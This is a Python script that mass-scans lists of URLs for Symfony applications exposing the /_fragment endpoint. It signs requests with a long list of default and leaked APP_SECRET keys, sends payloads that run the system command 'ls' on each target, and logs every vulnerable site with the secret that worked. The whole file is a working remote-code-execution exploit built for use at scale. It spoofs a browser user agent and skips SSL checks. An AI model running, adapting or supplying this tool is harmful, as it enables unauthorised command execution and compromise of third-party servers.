import asyncio
import aiohttp
import sys
from tqdm import tqdm

SECRET_KEYS = [
    'ThisTokenIsNotSoSecretChangeIt',
    'ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt',
    '',
    'ff6dc61a329dc96652bb092ec58981f7',
    '<app-secret-id>',
    '54de6f999a511111e232d9a5565782f1',
    'Wh4t3v3r',
    'cc86c7ca937636d5ddf1b754beb22a10',
    '00811410cc97286401bd64101121de999b',
    '29f90564f9e472955211be8c5e05ee0a',
    '1313eb8ff3f07370fe1501a2fe57a7c7',
    'c78ebf740b9db52319c2c0a201923d62',
    'test',
    '24e17c47430bd2044a61c131c1cf6990',
    'EDITME',
    '4fd436666d9d29dd0773348c9d4be05c',
    'd120bc9442daf50769276abd769df8e9',
    'HeyIAmSecret',
    '!ChangeMe!',
    '${APP_SECRET}',
    '17fe130b189469cd85de07822d362f56',
    '16b10f9d2e7885152d41ea6175886563a',
    's$cretf0rt3st',
    '44705a2f4fc85d70df5403ac8c7649fd',
    'd6f9c4f8997e182557e0602aa11c68ca',
    '%env(resolve:APP_SECRET)%',
    '964f0359a5e14dd8395fe334867e9709',
    '31ab70e5aea4699ba61deddc8438d2f1',
    '%secret%',
    '9fc8286ff23942648814f85ee18381bc',
    'foobar123',
    'ClickToGenerate',
    'secretthings',
    'thisvariableissuddenlyneededhere',
    '9258a6c0e5c19d0d58a8c48bbc757491',
    '2eb810c79fba0dd5c029a2fa53bfdb51',
    'secret',
    '81d300585b3dfdf6a3161e48d970e2baea252e42',
    'thesecret',
    'xxxxxxxxxx',
    'b92c43d084fa449351e0524bf60bf972',
    '24f508c1071242299426ae6af85d5309',
    '2a0f335581bd72b6077840e29d73ba36',
    'klasjdfklajsdfkajsÃ©dfkjiewoji',
    '6eb99720adab08a18624be3388d9f850',
    'cf4d2c8e2757307d2c679b176e6d6070',
    'pasteYourSecretKeyHere',
    'asecretkey',
    'This is a secret, change me',
    '300d7b538e92e90197c3b5b2d2f8fa3f',
    '966536d311ddae0996d1ffd21efa1027',
    '307fbdc5fd538f6d733e8a2f773b6a39',
    '5ea3114a349591bd131296e00f21c20a',
    '123456789',
    '13bb5de558715e730e972ab52626ab6a',
    '4d1f86e8d726abe792f9b65e1b60634c',
    'adc3f69b4b8262565f7abb9513de7f36',
    '5ub5upfxih0k8g44w00ogwc4swog4088o8444sssos8k888o8g',
    'ThisIsNotReallySecretButOK',
    'f78d2a48cbd00d92acf418a47a0a5c3e',
    '123',
    '8b3fdfaddad056c4ca759ffe81156eafb10f30fc',
    '43db4c69b1c581489f70c4512191e484',
    'Xjwr91jr~j3gV-d6w@2&oI)wFc5ZiL',
    '&lt;app-secret-id>',
    '8c6e5404e4f1e5934b5b2da46cadaef0',
    '1083dc7bfd20cc8c2bd10148631513ecf7',
    'd3e2fa9715287ba25b2d0fd41685ac031970f555',
    'super_secret',
    '6b566e17cf0965eb4db2fef5f41bae18',
    '859bdea01e182789f006e295b33275af',
    'bdb22a4d4f0ed0e35a97fed13f18646f',
    '8501eeca7890b89042ccae7318a44fb1',
    'dbd3856a5c7b24c92263323e797ec91c',
    'xxxxxxxxxxxxxxxxx',
    'bca0540d761fb1055893195ad87acf07',
    '123123',
    'IAmNotSecret',
    'WhateverYouLikeTo',
    'bf05fa89ece928e6d1ecec0c38a008ee',
    'xxxxxxxaxaxaxa',
    '97829395eda62d81f37980176ded371a',
    'YOUR_APP_SECRET',
    '879a6adeceeccbdc835a19f7e3aad7e8',
    'some_new_secret_123',
    'f96c2d666ace1278ec4c9e2304381bc3',
    '7d41a4acde33432b1d51eae15a301550',
    '236cd9304bb88b11e2bb4d56108dffa8',
    '8cfa2bd0b50b7db00e9c186be68f7ce7465123d3',
    'dd4aaa68cebc5f632a489bfa522a0adc',
    's3kr3t',
    '3d05afda019ed4e3faaf936e3ce393ba',
    'a3aeede1199a907af36438508bb59cb8',
    '!NotSoSecretChangeMe!',
    'gPguz9ImBhOIRCntIJPwbqbFJTZjqSHaq8AkTk2pdoHYw35rYRs9VHX0',
    '367d9a07f619290b5cae0ab961e4ab94',
    'changeMeInDotEnvDotLocal',
    '{your-app-secret}',
    '32bb1968190362d214325d23756ffd65',
    '4f113cda46d1808807ee7e263da59a47',
    '67d829bf61dc5f87a73fd814e2c9f629',
    'cbe614ba25712be13e5ec4b651f61b06',
    '8d2a5c935d8ef1c0e2b751147382bc75',
    'thefamoussecretkeylol',
    '%env(APP_SECRET)%',
    'fe2ed475a06588e021724adc11f52849',
    'b2baa331595d5773b63d2575d568be73',
    '$ecretf0rt3st',
    'SuperSecretToken'
]

CONCURRENCY_LIMIT = 200  # Adjust this value according to your needs
FIREFOX_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"

async def generate_hmac(url, secret):
    url_to_hash = f"{url}/_fragment?_path=_controller%3Dsystem%26command%3Dls%26return_value%3Dnull"
    php_code = (
        f"php -r \"echo(urlencode(base64_encode(hash_hmac('sha256', '{url_to_hash}', '{secret}', true))) . PHP_EOL);\""
    )
    result = await asyncio.create_subprocess_shell(php_code, stdout=asyncio.subprocess.PIPE)
    hmac, _ = await result.communicate()
    return hmac.decode('utf-8').strip()

async def send_request(session, url, hash_value):
    full_url = f"{url}/_fragment?_path=_controller%3Dsystem%26command%3Dls%26return_value%3Dnull&_hash={hash_value}"
    headers = {
        'User-Agent': FIREFOX_USER_AGENT
    }
    try:
        async with session.get(full_url, headers=headers, timeout=10, ssl=False) as response:  # Disable SSL verification
            response_text = await response.text(encoding='utf-8', errors='ignore')
            return response_text
    except (aiohttp.ClientConnectorError, aiohttp.ClientOSError, aiohttp.ServerDisconnectedError, aiohttp.TooManyRedirects) as e:
        return None
    except asyncio.TimeoutError:
        return None
    except Exception as e:
        return None

async def process_url(session, semaphore, url, secret, output_file, hashes_file, progress_bar):
    async with semaphore:
        hash_value = await generate_hmac(url, secret)
        if hash_value:
            response_text = await send_request(session, url, hash_value)
            if response_text and 'config.php' in response_text:
                try:
                    output_file.write(f"Vulnerable URL: {url} Secret Key: {secret}\n")
                    output_file.flush()
                    hashes_file.write(f"{url} Secret Key:{secret}\n")
                    hashes_file.flush()
                    print(f"Vulnerable URL: {url} Secret Key: {secret}")
                except Exception as e:
                    pass
        progress_bar.update(1)

async def process_urls(input_file_path, output_file_path, secret_keys):
    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    async with aiohttp.ClientSession() as session:
        with open(input_file_path, 'r', encoding='utf-8', errors='ignore') as input_file:
            urls = [line.strip() for line in input_file if line.strip()]

        with open(output_file_path, 'w', encoding='utf-8', errors='ignore') as output_file, \
             open('hashes.txt', 'w', encoding='utf-8', errors='ignore') as hashes_file:

            progress_bar = tqdm(total=len(urls) * len(secret_keys), desc="Processing URLs", unit="URL")

            tasks = []
            for url in urls:
                for secret in secret_keys:
                    task = process_url(session, semaphore, url, secret, output_file, hashes_file, progress_bar)
                    tasks.append(task)

            await asyncio.gather(*tasks)

            progress_bar.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python generate_hmac_and_check_config.py <input_file> <output_file>")
        sys.exit(1)

    input_file_path = sys.argv[1]  # Path to your text file containing URLs
    output_file_path = sys.argv[2]  # Path to your output text file

    asyncio.run(process_urls(input_file_path, output_file_path, SECRET_KEYS))
